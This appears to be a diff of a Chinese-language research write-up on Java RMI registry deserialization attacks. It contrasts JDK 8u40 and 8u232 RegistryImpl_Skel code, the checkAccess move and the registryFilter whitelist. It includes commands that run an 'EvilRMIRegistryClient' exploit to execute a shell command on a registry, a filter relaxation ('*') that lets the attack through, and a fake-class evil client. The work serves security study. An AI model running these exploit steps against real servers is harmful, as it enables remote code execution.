+            java.lang.String[] $result = server.list();
+            try {
+                java.io.ObjectOutput out = call.getResultStream(true);
+                out.writeObject($result);
+            } catch (java.io.IOException e) {
+                throw new java.rmi.MarshalException("error marshalling return", e);
+            }
+            break;
+        }
+
+        case 2: // lookup(String)
+        {
+            java.lang.String $param_String_1;
+            try {
+                java.io.ObjectInput in = call.getInputStream();
+                $param_String_1 = (java.lang.String) in.readObject();
+            } catch (ClassCastException | IOException | ClassNotFoundException e) {
+                call.discardPendingRefs();
+                throw new java.rmi.UnmarshalException("error unmarshalling arguments", e);
+            } finally {
+                call.releaseInputStream();
+            }
+            java.rmi.Remote $result = server.lookup($param_String_1);
+            try {
+                java.io.ObjectOutput out = call.getResultStream(true);
+                out.writeObject($result);
+            } catch (java.io.IOException e) {
+                throw new java.rmi.MarshalException("error marshalling return", e);
+            }
+            break;
+        }
+
+        case 3: // rebind(String, Remote)
+        {
+            /*
+             * 142行，8u232把RegistryImpl.checkAccess()挪到
+             * ObjectInputStream.readObject()之前
+             */
+            // Check access before reading the arguments
+            RegistryImpl.checkAccess("Registry.rebind");
+
+            java.lang.String $param_String_1;
+            java.rmi.Remote $param_Remote_2;
+            try {
+                java.io.ObjectInput in = call.getInputStream();
+                $param_String_1 = (java.lang.String) in.readObject();
+                /*
+                 * 149行，反序列化Remote对象
+                 */
+                $param_Remote_2 = (java.rmi.Remote) in.readObject();
+            } catch (ClassCastException | IOException | java.lang.ClassNotFoundException e) {
+                call.discardPendingRefs();
+                throw new java.rmi.UnmarshalException("error unmarshalling arguments", e);
+            } finally {
+                call.releaseInputStream();
+            }
+            server.rebind($param_String_1, $param_Remote_2);
+            try {
+                call.getResultStream(true);
+            } catch (java.io.IOException e) {
+                throw new java.rmi.MarshalException("error marshalling return", e);
+            }
+            break;
+        }
+
+        case 4: // unbind(String)
+        {
+            // Check access before reading the arguments
+            RegistryImpl.checkAccess("Registry.unbind");
+
+            java.lang.String $param_String_1;
+            try {
+                java.io.ObjectInput in = call.getInputStream();
+                $param_String_1 = (java.lang.String) in.readObject();
+            } catch (ClassCastException | IOException | ClassNotFoundException e) {
+                call.discardPendingRefs();
+                throw new java.rmi.UnmarshalException("error unmarshalling arguments", e);
+            } finally {
+                call.releaseInputStream();
+            }
+            server.unbind($param_String_1);
+            try {
+                call.getResultStream(true);
+            } catch (java.io.IOException e) {
+                throw new java.rmi.MarshalException("error marshalling return", e);
+            }
+            break;
+        }
+
+        default:
+            throw new java.rmi.UnmarshalException("invalid method number");
+    }
+}
+```
+
+8u232相比8u40有一个很大的安全增强，前者把RegistryImpl.checkAccess()挪到
+ObjectInputStream.readObject()之前了，这使得远程bind()、rebind()彻底不可行，
+远程"ysoserial/RMIRegistryExploit"就这么废了。
+
+```java
+/*
+ * 用JD-GUI看8u40的rt.jar
+ *
+ * sun.rmi.registry.RegistryImpl_Skel
+ */
+public void dispatch(Remote paramRemote, RemoteCall paramRemoteCall, int paramInt, long paramLong)
+  throws Exception
+{
+  if (paramLong != 4905912898345647071L) {
+    throw new SkeletonMismatchException("interface hash mismatch");
+  }
+  RegistryImpl localRegistryImpl = (RegistryImpl)paramRemote;
+  Object localObject1;
+  Object localObject2;
+  Remote localRemote;
+  switch (paramInt)
+  {
+  case 0:
+    try
+    {
+      ObjectInput localObjectInput3 = paramRemoteCall.getInputStream();
+/*
+ * bind(String name, Remote obj)
+ *
+ * 先反序列化两个形参name、obj
+ */
+      localObject1 = (String)localObjectInput3.readObject();
+      localObject2 = (Remote)localObjectInput3.readObject();
+    }
+    catch (IOException localIOException8)
+    {
+      throw new UnmarshalException("error unmarshalling arguments", localIOException8);
+    }
+    catch (ClassNotFoundException localClassNotFoundException3)
+    {
+      throw new UnmarshalException("error unmarshalling arguments", localClassNotFoundException3);
+    }
+    finally
+    {
+      paramRemoteCall.releaseInputStream();
+    }
+/*
+ * RegistryImpl.bind()中调用checkAccess("Registry.bind")
+ */
+    localRegistryImpl.bind((String)localObject1, (Remote)localObject2);
+    try
+    {
+      paramRemoteCall.getResultStream(true);
+    }
+    catch (IOException localIOException3)
+    {
+      throw new MarshalException("error marshalling return", localIOException3);
+    }
+  case 1:
+...
+  case 2:
+...
+  case 3:
+    try
+    {
+      ObjectInput localObjectInput4 = paramRemoteCall.getInputStream();
+/*
+ * rebind(String name, Remote obj)
+ *
+ * 先反序列化两个形参name、obj
+ */
+      localObject1 = (String)localObjectInput4.readObject();
+      localRemote = (Remote)localObjectInput4.readObject();
+    }
+    catch (IOException localIOException9)
+    {
+      throw new UnmarshalException("error unmarshalling arguments", localIOException9);
+    }
+    catch (ClassNotFoundException localClassNotFoundException4)
+    {
+      throw new UnmarshalException("error unmarshalling arguments", localClassNotFoundException4);
+    }
+    finally
+    {
+      paramRemoteCall.releaseInputStream();
+    }
+/*
+ * RegistryImpl.rebind()中调用checkAccess("Registry.rebind")
+ */
+    localRegistryImpl.rebind((String)localObject1, localRemote);
+    try
+    {
+      paramRemoteCall.getResultStream(true);
+    }
+    catch (IOException localIOException5)
+    {
+      throw new MarshalException("error marshalling return", localIOException5);
+    }
+  case 4:
+...
+  default:
+    throw new UnmarshalException("invalid method number");
+  }
+}
+```
+
+相比8u40，8u232的RegistryImpl.bind()、RegistryImpl.rebind()不再调用
+RegistryImpl.checkAccess()。
+
+前面这些分析只是满足个人好奇心，不看也罢。要点已合并到"8) 简化版调用关系"
+中，可以提纲挈领式地看到全貌。
+
+12) 8u232为什么失败
+
+假设目录结构是:
+.
+|
++---test2
+|       RMIRegistryServer.class
+|       commons-collections-3.1.jar
+|
+\---test3
+        EvilRMIRegistryClientWithBadAttributeValueExpException3.class
+        GeneralInvocationHandler3.class
+        commons-collections-3.1.jar
 
 在test2目录执行:
 
 java \
--Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
--Djava.naming.provider.url=rmi://192.168.65.23:1099 \
-SomeEvilClient any "msg from client"
+-Djava.rmi.server.hostname=192.168.65.23 \
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryServer 1099
 
-Exception in thread "main" java.lang.IllegalArgumentException: argument type mismatch
-        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
-        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
-        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
-        at java.lang.reflect.Method.invoke(Method.java:498)
-        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:357)
+这次用8u232启动RMIRegistryServer。
+
+在test3目录执行:
+
+java \
+-cp "commons-collections-3.1.jar:." \
+EvilRMIRegistryClientWithBadAttributeValueExpException3 192.168.65.23 1099 \
+"/bin/touch /tmp/scz_is_here"
+
+服务端、客户端在同一主机，可以通过RegistryImpl.checkAccess()检查。
+
+客户端抛异常:
+
+Exception in thread "main" java.rmi.ServerException: RemoteException occurred in server thread; nested exception is:
+        java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
+        java.io.InvalidClassException: filter status: REJECTED
+        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:389)
         at sun.rmi.transport.Transport$1.run(Transport.java:200)
         at sun.rmi.transport.Transport$1.run(Transport.java:197)
         at java.security.AccessController.doPrivileged(Native Method)
@@ -508,862 +1335,991 @@ Exception in thread "main" java.lang.IllegalArgumentException: argument type mis
         at java.lang.Thread.run(Thread.java:748)
         at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:303)
         at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:279)
-        at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:161)
-        at java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod(RemoteObjectInvocationHandler.java:227)
-        at java.rmi.server.RemoteObjectInvocationHandler.invoke(RemoteObjectInvocationHandler.java:179)
-        at com.sun.proxy.$Proxy0.Echo(Unknown Source)
-        at SomeEvilClient.main(SomeEvilClient.java:22)
+        at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:375)
+        at sun.rmi.registry.RegistryImpl_Stub.rebind(RegistryImpl_Stub.java:158)
+        at EvilRMIRegistryClientWithBadAttributeValueExpException3.main(EvilRMIRegistryClientWithBadAttributeValueExpException3.java:109)
+Caused by: java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
+        java.io.InvalidClassException: filter status: REJECTED
+        at sun.rmi.registry.RegistryImpl_Skel.dispatch(RegistryImpl_Skel.java:152)
+        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:469)
+        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:301)
+        at sun.rmi.transport.Transport$1.run(Transport.java:200)
+        at sun.rmi.transport.Transport$1.run(Transport.java:197)
+        at java.security.AccessController.doPrivileged(Native Method)
+        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
+        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:573)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:834)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:688)
+        at java.security.AccessController.doPrivileged(Native Method)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:687)
+        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
+        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
+        at java.lang.Thread.run(Thread.java:748)
+Caused by: java.io.InvalidClassException: filter status: REJECTED
+        at java.io.ObjectInputStream.filterCheck(ObjectInputStream.java:1254)
+        at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1877)
+        at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1750)
+        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2041)
+        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1572)
+        at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:2286)
+        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2166)
+        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2068)
+        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1572)
+        at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:2286)
+        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2210)
+        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2068)
+        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1572)
+        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:430)
+        at sun.rmi.registry.RegistryImpl_Skel.dispatch(RegistryImpl_Skel.java:149)
+        ... 14 more
 
-客户端不会得到正常返回，抛出异常。服务端输出:
-
-PublicKnown.readObject()
-
-normal版PublicKnown.readObject()被调用了。SomeDynamicServer并未使用normal
-版PublicKnown，PublicKnown.class仅仅出现在SomeDynamicServer的CLASSPATH中，
-通过SomeEvilClient，SomeDynamicServer间接执行了PublicKnown.readObject()。
-如果normal版PublicKnown本身存在反序列化漏洞，意味着客户端可以远程触发服务
-端的反序列化漏洞。太猥琐了，这种洞我喜欢。
-
-用8u232测试成功。起初以为8u112之后不让这么搞了，那Oracle是咋修补的？
-
-若客户端PublicKnown的serialVersionUID跟服务端PublicKnown的serialVersionUID
-不同，客户端会抛另一种异常，提示:
-
-java.io.InvalidClassException: PublicKnown; local class incompatible: \
-stream classdesc serialVersionUID = <wrong>, \
-local class serialVersionUID = <correct>
-
-<wrong>对应客户端serialVersionUID，<correct>对应服务端serialVersionUID。
-
-11.1) PublicKnown.readObject()调用栈回溯
+调试RMIRegistryServer:
 
 java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
--Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
--Djava.naming.provider.url=rmi://192.168.65.23:1099 \
-SomeDynamicServer any
+-Djava.rmi.server.hostname=192.168.65.23 \
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryServer 1099
 
 jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005
 
-stop in PublicKnown.readObject
+catch java.io.InvalidClassException
 
-  [1] PublicKnown.readObject (PublicKnown.java:22), pc = 0
-  [2] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
-  [3] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
-  [4] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
-  [5] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
-  [6] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,170), pc = 24
-  [7] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,177), pc = 119
+  [1] java.io.ObjectInputStream.filterCheck (ObjectInputStream.java:1,256), pc = 197
+  [2] java.io.ObjectInputStream.readNonProxyDesc (ObjectInputStream.java:1,877), pc = 154
+  [3] java.io.ObjectInputStream.readClassDesc (ObjectInputStream.java:1,750), pc = 86
+  [4] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,041), pc = 22
+  [5] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
+  [6] java.io.ObjectInputStream.defaultReadFields (ObjectInputStream.java:2,286), pc = 150
+  [7] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,166), pc = 56
   [8] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
   [9] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
-  [10] java.io.ObjectInputStream.readObject (ObjectInputStream.java:430), pc = 19
-  [11] sun.rmi.server.UnicastRef.unmarshalValue (UnicastRef.java:322), pc = 171
-  [12] sun.rmi.server.UnicastServerRef.unmarshalParametersUnchecked (UnicastServerRef.java:629), pc = 31
-  [13] sun.rmi.server.UnicastServerRef.unmarshalParameters (UnicastServerRef.java:617), pc = 23
-  [14] sun.rmi.server.UnicastServerRef.dispatch (UnicastServerRef.java:338), pc = 168
-  [15] sun.rmi.transport.Transport$1.run (Transport.java:200), pc = 23
-  [16] sun.rmi.transport.Transport$1.run (Transport.java:197), pc = 1
-  [17] java.security.AccessController.doPrivileged (native method)
-  [18] sun.rmi.transport.Transport.serviceCall (Transport.java:196), pc = 157
-  [19] sun.rmi.transport.tcp.TCPTransport.handleMessages (TCPTransport.java:573), pc = 185
-  [20] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0 (TCPTransport.java:834), pc = 696
-  [21] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0 (TCPTransport.java:688), pc = 1
-  [22] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$4.1873373936.run (null), pc = 4
-  [23] java.security.AccessController.doPrivileged (native method)
-  [24] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run (TCPTransport.java:687), pc = 58
-  [25] java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1,149), pc = 95
-  [26] java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:624), pc = 5
-  [27] java.lang.Thread.run (Thread.java:748), pc = 11
+  [10] java.io.ObjectInputStream.defaultReadFields (ObjectInputStream.java:2,286), pc = 150
+  [11] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,210), pc = 298
+  [12] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
+  [13] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
+  [14] java.io.ObjectInputStream.readObject (ObjectInputStream.java:430), pc = 19
+  [15] sun.rmi.registry.RegistryImpl_Skel.dispatch (RegistryImpl_Skel.java:149), pc = 429
+  [16] sun.rmi.server.UnicastServerRef.oldDispatch (UnicastServerRef.java:469), pc = 137
+  [17] sun.rmi.server.UnicastServerRef.dispatch (UnicastServerRef.java:301), pc = 44
+  [18] sun.rmi.transport.Transport$1.run (Transport.java:200), pc = 23
+  [19] sun.rmi.transport.Transport$1.run (Transport.java:197), pc = 1
+  [20] java.security.AccessController.doPrivileged (native method)
+  [21] sun.rmi.transport.Transport.serviceCall (Transport.java:196), pc = 157
+  [22] sun.rmi.transport.tcp.TCPTransport.handleMessages (TCPTransport.java:573), pc = 185
+  [23] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0 (TCPTransport.java:834), pc = 696
+  [24] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0 (TCPTransport.java:688), pc = 1
+  [25] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$5.1362723662.run (null), pc = 4
+  [26] java.security.AccessController.doPrivileged (native method)
+  [27] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run (TCPTransport.java:687), pc = 58
+  [28] java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1,149), pc = 95
+  [29] java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:624), pc = 5
+  [30] java.lang.Thread.run (Thread.java:748), pc = 11
 
-11.2) 简化版调用关系
+参看:
 
-参:
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/java/io/ObjectInputStream.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/registry/RegistryImpl.java
 
-http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/server/UnicastServerRef.java
+ObjectInputStream.filterCheck()会调用RegistryImpl.registryFilter()，后者有
+一张白名单，若类不在白名单中，后者返回"ObjectInputFilter.Status.REJECTED"，
+前者主动抛出"InvalidClassException"，此时尚未调用目标类的readObject()。要
+点已合并到"8) 简化版调用关系"中，可以提纲挈领式地看到全貌。
 
---------------------------------------------------------------------------
-TCPTransport.handleMessages                     // 8u232
-  Transport.serviceCall
-    UnicastServerRef.dispatch
-      UnicastServerRef.oldDispatch              // UnicastServerRef:301
-                                                // 本例不会走这个流程
-        RegistryImpl_Skel.dispatch
-          RegistryImpl.checkAccess              // 8u232的简置检查，本例不会至此
-      UnicastServerRef.unmarshalCustomCallData  // UnicastServerRef:337
-                                                // 这里面有过滤器检查
-      UnicastServerRef.unmarshalParameters      // UnicastServerRef:338
-        UnicastServerRef.unmarshalParametersUnchecked
-          UnicastRef.unmarshalValue
-            ObjectInputStream.readObject
-              PublicKnown.readObject
---------------------------------------------------------------------------
+从简化版调用关系可以看到，虽然8u232的RegistryImpl.registryFilter()有张白名
+单，但在现实世界中，更可能先触发RegistryImpl.checkAccess()。一般调试PoC时
+服务端、客户端在同一台主机上，会无意中忽视RegistryImpl.checkAccess()的存在。
 
-12) 关于package的幺蛾子
+12.1) sun.rmi.registry.RegistryImpl.registryFilter
 
-前面为了演示方便，没有使用package。测试"JtaTransactionManager利用链"时需要
-"import Message;"，但javac不认这个语法，至少要有一个"."。没办法，只好新搞
-一批演示代码。
+RegistryImpl.registryFilter()是从8u121-b04开始增加的安全检查，参看:
 
-上面关于package的讨论是我初次接触CVE-2017-3241时的无知讨论，是错误的。后面
-会在"CVE-2017-3241进阶"中演示不使用package也可以。
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u121-b04/src/share/classes/sun/rmi/registry/RegistryImpl.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u121-b04/src/share/classes/sun/misc/ObjectInputFilter.java
 
-12.1) Message2.java
-
---------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g any/Message2.java
+```java
+/**
+ * ObjectInputFilter to filter Registry input objects.
+ * The list of acceptable classes is limited to classes normally
+ * stored in a registry.
+ *
+ * @param filterInfo access to the class, array length, etc.
+ * @return  {@link ObjectInputFilter.Status#ALLOWED} if allowed,
+ *          {@link ObjectInputFilter.Status#REJECTED} if rejected,
+ *          otherwise {@link ObjectInputFilter.Status#UNDECIDED}
  */
-package any;
+private static ObjectInputFilter.Status registryFilter(ObjectInputFilter.FilterInfo filterInfo) {
+    if (registryFilter != null) {
+        ObjectInputFilter.Status status = registryFilter.checkInput(filterInfo);
+        if (status != ObjectInputFilter.Status.UNDECIDED) {
+            // The Registry filter can override the built-in white-list
+            return status;
+        }
+    }
 
-import java.io.*;
-
+    if (filterInfo.depth() > REGISTRY_MAX_DEPTH) {
+        return ObjectInputFilter.Status.REJECTED;
+    }
+    Class<?> clazz = filterInfo.serialClass();
+    if (clazz != null) {
+        if (clazz.isArray()) {
+            if (filterInfo.arrayLength() >= 0 && filterInfo.arrayLength() > REGISTRY_MAX_ARRAY_SIZE) {
+                return ObjectInputFilter.Status.REJECTED;
+            }
+            do {
+                // Arrays are allowed depending on the component type
+                clazz = clazz.getComponentType();
+            } while (clazz.isArray());
+        }
+        if (clazz.isPrimitive()) {
+            // Arrays of primitives are allowed
+            return ObjectInputFilter.Status.ALLOWED;
+        }
 /*
- * 在本次演示方案中，必须是public的
+ * 8u121-b04，415行，白名单检查
  */
-public class Message2 implements Serializable
-{
-    private static final long   serialVersionUID    = 0x5120131473637a00L;
-
-    private String  msg;
-
-    public Message2 ()
-    {
+        if (String.class == clazz
+                || java.lang.Number.class.isAssignableFrom(clazz)
+                || Remote.class.isAssignableFrom(clazz)
+                || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)
+                || UnicastRef.class.isAssignableFrom(clazz)
+                || RMIClientSocketFactory.class.isAssignableFrom(clazz)
+                || RMIServerSocketFactory.class.isAssignableFrom(clazz)
+                || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)
+                || java.rmi.server.UID.class.isAssignableFrom(clazz)) {
+            return ObjectInputFilter.Status.ALLOWED;
+        } else {
+            return ObjectInputFilter.Status.REJECTED;
+        }
     }
-
-    public Message2 ( String msg )
-    {
-        this.msg    = msg;
-    }
-
-    public String getMsg ()
-    {
-        return( this.msg );
-    }
-
-    public void setMsg ( String msg )
-    {
-        this.msg    = msg;
-    }
+    return ObjectInputFilter.Status.UNDECIDED;
 }
---------------------------------------------------------------------------
+```
 
-12.2) SomeInterface2.java
+8u121-b03还没有RegistryImpl.registryFilter()。
 
---------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g SomeInterface2.java
- */
-import java.rmi.*;
-import any.Message2;
+12.2) sun.rmi.registry.registryFilter属性
 
-public interface SomeInterface2 extends Remote
-{
-    public String Echo ( Message2 sth ) throws RemoteException;
-}
---------------------------------------------------------------------------
-
-12.3) SomeInterface2Impl.java
-
---------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g SomeInterface2Impl.java
- */
-import java.rmi.RemoteException;
-import java.rmi.server.UnicastRemoteObject;
-import any.Message2;
-
-public class SomeInterface2Impl extends UnicastRemoteObject implements SomeInterface2
-{
-    private static final long   serialVersionUID    = 0x5120131473637a01L;
-
-    /*
-     * 在本次演示方案中，不再是protected
-     */
-    public SomeInterface2Impl () throws RemoteException
-    {
-        super();
-    }
-
-    @Override
-    public String Echo ( Message2 sth ) throws RemoteException
-    {
-        return( "[" + sth.getMsg() + "]" );
-    }
-}
---------------------------------------------------------------------------
-
-12.4) SomeDynamicServer2.java
-
---------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g SomeDynamicServer2.java
- */
-import javax.naming.*;
-
-public class SomeDynamicServer2
-{
-    public static void main ( String[] argv ) throws Exception
-    {
-        String          name    = argv[0];
-        Context         ctx     = new InitialContext();
-        SomeInterface2  some    = new SomeInterface2Impl();
-        ctx.rebind( name, some );
-    }
-}
---------------------------------------------------------------------------
-
-12.5) SomeNormalClient2.java
-
---------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g SomeNormalClient2.java
- */
-import javax.naming.*;
-import any.Message2;
-
-public class SomeNormalClient2
-{
-    public static void main ( String[] argv ) throws Exception
-    {
-        String          name    = argv[0];
-        String          sth     = argv[1];
-        Context         ctx     = new InitialContext();
-        SomeInterface2  some    = ( SomeInterface2 )ctx.lookup( name );
-        String          resp    = some.Echo( new Message2( sth ) );
-        System.out.println( resp );
-    }
-}
---------------------------------------------------------------------------
-
-12.6) normal版PublicKnown2.java
-
---------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g normal/PublicKnown2.java
- */
-package other;
-
-import java.io.*;
-
-/*
- * normal版PublicKnown2
- */
-public class PublicKnown2 implements Serializable
-{
-    private static final long   serialVersionUID    = 0x5120131473637a02L;
-
-    private void readObject ( ObjectInputStream ois )
-        throws IOException, ClassNotFoundException
-    {
-        System.out.println( "PublicKnown2.readObject()" );
-        ois.defaultReadObject();
-    }
-}
---------------------------------------------------------------------------
-
-12.7) fake版PublicKnown2.java
-
---------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g fake/PublicKnown2.java
- */
-package other;
-
-import any.Message2;
-
-/*
- * fake版PublicKnown2
- */
-public class PublicKnown2 extends Message2
-{
-    private static final long   serialVersionUID    = 0x5120131473637a02L;
-}
---------------------------------------------------------------------------
-
-12.8) SomeEvilClient2.java
-
---------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g SomeEvilClient2.java
- */
-import javax.naming.*;
-import other.PublicKnown2;
-
-public class SomeEvilClient2
-{
-    public static void main ( String[] argv ) throws Exception
-    {
-        String          name    = argv[0];
-        String          sth     = argv[1];
-        Context         ctx     = new InitialContext();
-        SomeInterface2  some    = ( SomeInterface2 )ctx.lookup( name );
-        /*
-         * 使用fake版PublicKnown2
-         */
-        PublicKnown2    p       = new PublicKnown2();
-        p.setMsg( sth );
-        String          resp    = some.Echo( p );
-        System.out.println( resp );
-    }
-}
---------------------------------------------------------------------------
-
-12.9) 编译
-
-假设目录结构是:
-
-.
-|
-|   SomeDynamicServer2.class
-|   SomeDynamicServer2.java
-|   SomeEvilClient2.class
-|   SomeEvilClient2.java
-|   SomeInterface2.class
-|   SomeInterface2.java
-|   SomeInterface2Impl.class
-|   SomeInterface2Impl.java
-|   SomeNormalClient2.class
-|   SomeNormalClient2.java
-|
-+---any
-|       Message2.class
-|       Message2.java
-|
-+---fake
-|       PublicKnown2.class (fake版)
-|       PublicKnown2.java
-|
-+---normal
-|       PublicKnown2.class (normal版)
-|       PublicKnown2.java
-|
-\---other
-        PublicKnown2.class (fake版)
-
-编译:
-
-javac -encoding GBK -g any/Message2.java
-javac -encoding GBK -g SomeInterface2.java
-javac -encoding GBK -g SomeInterface2Impl.java
-javac -encoding GBK -g SomeDynamicServer2.java
-javac -encoding GBK -g SomeNormalClient2.java
-javac -encoding GBK -g normal/PublicKnown2.java
-javac -encoding GBK -g fake/PublicKnown2.java
-javac -encoding GBK -g SomeEvilClient2.java
-
-12.10) 测试
-
-假设目录结构是:
-
-.
-|
-+---test1
-|   |   SomeDynamicServer2.class
-|   |   SomeInterface2.class
-|   |   SomeInterface2Impl.class
-|   |
-|   +---any
-|   |       Message2.class
-|   |
-|   \---other
-|           PublicKnown2.class (normal版)
-|
-\---test2
-    |   SomeEvilClient2.class
-    |   SomeInterface2.class
-    |   SomeNormalClient2.class
-    |
-    +---any
-    |       Message2.class
-    |
-    \---other
-            PublicKnown2.class (fake版)
-
-在test1目录执行:
-
-rmiregistry 1099
-
-java \
--Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
--Djava.naming.provider.url=rmi://192.168.65.23:1099 \
-SomeDynamicServer2 any
+如果特别想用8u232测试，只能动用sun.rmi.registry.registryFilter属性。参[60]，
+有示例。
 
 在test2目录执行:
 
 java \
--Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
--Djava.naming.provider.url=rmi://192.168.65.23:1099 \
-SomeNormalClient2 any "msg from client"
+-Dsun.rmi.registry.registryFilter='javax.management.BadAttributeValueExpException;java.**;org.apache.**' \
+-Djava.rmi.server.hostname=192.168.65.23 \
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryServer 1099
+
+或者更简单的:
 
 java \
--Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
--Djava.naming.provider.url=rmi://192.168.65.23:1099 \
-SomeEvilClient2 any "msg from client"
+-Dsun.rmi.registry.registryFilter='*' \
+-Djava.rmi.server.hostname=192.168.65.23 \
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryServer 1099
 
-13) 关于AbstractPlatformTransactionManager的幺蛾子
+registryFilter属性的语法比较奇怪，单个"*"表示全部允许，但为了表示允许以
+"java."打头的类，要写成"java.**"。
 
-Message、PublicKnown已将漏洞原理讲透了，Message2、PublicKnown2只是为了让演
-示更贴近现实世界。很不幸，想演示如何在这个漏洞中使用JtaTransactionManager，
-不能用Message2。与这个洞本身没啥关系，仅仅是JtaTransactionManager利用链不
-适用于Message2，关于这点，吃亏之后通过调试才意识到的，后面会细说。新搞一批
-演示代码。
+在test3目录执行:
 
-13.1) Message3.java
+java \
+-cp "commons-collections-3.1.jar:." \
+EvilRMIRegistryClientWithBadAttributeValueExpException3 192.168.65.23 1099 \
+"/bin/touch /tmp/scz_is_here"
+
+12.3) java.security文件
+
+关于registryFilter属性的语法，可以在JDK目录中找:
+
+jre/lib/security/java.security
+
+这个文件的注释部分详解了registryFilter属性的语法。
 
 --------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g -cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar" any/Message3.java
- */
-package any;
+#
+# Serialization process-wide filter
+#
+# A filter, if configured, is used by java.io.ObjectInputStream during
+# deserialization to check the contents of the stream.
+# A filter is configured as a sequence of patterns, each pattern is either
+# matched against the name of a class in the stream or defines a limit.
